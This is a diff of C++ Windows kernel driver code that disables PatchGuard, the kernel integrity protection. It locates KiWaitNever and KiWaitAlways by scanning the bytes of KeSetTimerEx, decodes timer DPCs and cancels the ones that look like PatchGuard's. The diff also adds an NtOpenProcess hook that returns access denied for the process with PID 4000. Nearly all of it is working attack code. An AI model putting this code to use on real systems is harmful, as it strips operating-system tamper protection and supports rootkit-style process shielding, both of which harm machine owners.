@@ -7,8 +7,7 @@ PKDPC decrypt_dpc_routine(PKTIMER timer) {
 	static __int64 KiWaitNever;
 	static __int64 KiWaitAlways;
 
-	UNICODE_STRING routineName;
-	RtlInitUnicodeString(&routineName, L"KeSetTimerEx");
+	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"KeSetTimerEx");
 	PVOID KeSetTimerEx = MmGetSystemRoutineAddress(&routineName);
 	if (!KeSetTimerEx)
 		return nullptr;
@@ -20,12 +19,12 @@ PKDPC decrypt_dpc_routine(PKTIMER timer) {
 		if (function_dism[0x1C] == 0x48 && function_dism[0x1D] == 0x8B && function_dism[0x1E] == 0x05) {
 			LONG displacement = *(LONG*)&function_dism[0x1F];
 			PVOID KiWaitNeverAddr = (PVOID)((PUCHAR)KeSetTimerEx + 0x23 + displacement);
-			KiWaitNever = *(PINT64)KiWaitNeverAddr;
+			KiWaitNever = *(__int64*)KiWaitNeverAddr;
 		}
 		if (function_dism[0x26] == 0x48 && function_dism[0x27] == 0x8B && function_dism[0x28] == 0x35) {
 			LONG displacement = *(LONG*)&function_dism[0x29];
 			PVOID KiWaitAlwaysAddr = (PVOID)((PUCHAR)KeSetTimerEx + 0x2D + displacement);
-			KiWaitAlways = *(PINT64)KiWaitAlwaysAddr;
+			KiWaitAlways = *(__int64*)KiWaitAlwaysAddr;
 		}
 	}
 
@@ -39,12 +38,29 @@ NTSTATUS NtOpenProcess_Hook(
 	_Out_ PHANDLE ProcessHandle,
 	_In_ ACCESS_MASK DesiredAccess,
 	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
-	_In_opt_ PCLIENT_ID ClientId)
-{
+	_In_opt_ PCLIENT_ID ClientId
+) {
+	hook::disable_hook(&NtOpenProcess_Hook);
 
-	NTSTATUS status = NtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
+	NTSTATUS status;
 
+	if (ClientId) {
+		ULONG pid = HandleToULong(ClientId->UniqueProcess);
+		if (pid == 4000) {
+			status = STATUS_ACCESS_DENIED;
+			hook::enable_hook(&NtOpenProcess_Hook);
+			return status;
+		}
+	}
 
+	status = NtOpenProcess(
+		ProcessHandle,
+		DesiredAccess,
+		ObjectAttributes,
+		ClientId
+	);
+
+	hook::enable_hook(&NtOpenProcess_Hook);
 
 	return status;
 }
@@ -103,25 +119,37 @@ extern "C" NTSTATUS FxDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING R
 						continue;
 					}
 
+					// common dpc method
 					if ((__int64)dpc->DeferredContext >> 47 != -1 && (__int64)dpc->DeferredContext >> 47 != 0) {
 						if (KeCancelTimer(timer)) {
 							patchguard_disabled = true;
 						}
 					}
 
-					// only two dpc use this metho
+					// only two dpc use this method
 					if ((unsigned __int64)(((__int64)dpc->DeferredContext >> 47) + 1) > 1) {
 						if (KeCancelTimer(timer)) {
 							patchguard_disabled = true;
 						}
 					}
 
+					// FsRtlTruncateSmallMcb
+					__int64 result = ((__int64)dpc->DeferredContext >> 47) + 1;
+					if ((__int64)dpc->DeferredContext >> 47 != -1 && result != 1) {
+						if (KeCancelTimer(timer)) {
+							patchguard_disabled = true;
+						}
+					}
 				}
 			}
 		}
 	}
 
-	DbgPrint("patchguard status %s", patchguard_disabled ? "disabled" : "enabled");
+	if (!patchguard_disabled) {
+		DbgPrint("failed to disable patchguard \n");
+	}
+
+	DbgPrint("patchguard status ( %s ) \n", patchguard_disabled ? "disabled" : "enabled");
 
 	return patchguard_disabled ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
 }
